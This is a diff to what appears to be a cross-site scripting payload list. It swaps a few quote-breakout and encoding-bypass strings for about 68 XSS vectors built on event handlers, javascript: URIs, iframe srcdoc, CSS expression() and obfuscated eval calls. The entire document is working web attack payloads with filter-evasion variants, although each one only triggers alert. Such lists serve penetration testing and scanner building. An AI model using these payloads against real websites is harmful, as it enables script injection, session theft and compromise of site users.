@@ -1,15 +1,68 @@
-';alert(1)//
-\';alert(1)//
-";alert(1)//
-\";alert(1)//
-<scr<script>ipt>alert(1)</scr</script>ipt>
-<scRiPt>alert(1)</sCriPt>
-%3cscript%3ealert(1)%3c/script%3e
-&#60;script&#62;alert(1)&#60;/script&#62;
-\x3cscript\x3ealert(1)\x3c/script\x3e
-\u003cscript\u003ealert(1)\u003c/script\u003e
-<img src=`x` onerror=alert(1)>
-<img/src=x/onerror=alert(1)>
-jaVasCript:alert(1)
-java&#115;cript:alert(1)
-java&#x73;cript:alert(1)
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror=alert(&#39;XSS&#39;)>
+<img src=x onerror=alert(&#x27;XSS&#x27;)>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<img src=x onerror=window.alert(1)>
+<img src=x onerror=self.alert(1)>
+<img src=x onerror=top.alert(1)>
+<img src=x onerror=parent.alert(1)>
+<img src=x onerror=globalThis.alert(1)>
+<img src=x onerror=frames.alert(1)>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=window["alert"](1)>
+<img src=x onerror=(window)['alert'](1)>
+<img src=x onerror=this['alert'](1)>
+<img src=x onerror=Function('alert(1)')()>
+<img src=x onerror=new Function('alert(1)')()>
+<img src=x onerror=setTimeout('alert(1)')>
+<img src=x onerror=setInterval('alert(1)',1)>
+<img src=x onerror=setImmediate('alert(1)')>
+<img src=x onerror=execScript('alert(1)')>
+<img src=x onerror=msSetImmediate('alert(1)')>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert`1`>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<svg onload=window.alert(1)>
+<svg onload=window['alert'](1)>
+<svg onload=Function('alert(1)')()>
+<svg onload=setTimeout('alert(1)')>
+<svg onload=new Function('alert(1)')()>
+<body onload=alert(1)>
+<body onload=alert`1`>
+<body onload=window['alert'](1)>
+<body onload=Function('alert(1)')()>
+<input autofocus onfocus=alert(1)>
+<input autofocus onfocus=alert`1`>
+<input autofocus onfocus=window['alert'](1)>
+<details open ontoggle=alert(1)>
+<details open ontoggle=alert`1`>
+<marquee onstart=alert(1)>
+<marquee onstart=alert`1`>
+<a href=javascript:alert(1)>click</a>
+<a href=javascript:alert`1`>click</a>
+<a href="javascript:eval(atob('YWxlcnQoMSk='))">click</a>
+<a href="javascript:Function('alert(1)')()">click</a>
+<a href="javascript:setTimeout('alert(1)')">click</a>
+<a href="javascript:new Function('alert(1)')()">click</a>
+<iframe src=javascript:alert(1)></iframe>
+<iframe src="javascript:alert`1`"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<form><button formaction=javascript:alert(1)>click</button></form>
+<form id=x><button form=x formaction=javascript:alert(1)>click</button></form>
+<table background=javascript:alert(1)>
+<td background=javascript:alert(1)>
+<div style=background-image:url(javascript:alert(1))>
+<div style=content:url(javascript:alert(1))>
+<div style=width:expression(alert(1))>
+<xss style=xss:expression(alert(1))>
+<math><mtext onmouseover=alert(1)>X</mtext></math>
+<svg><use onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x dur=1s>
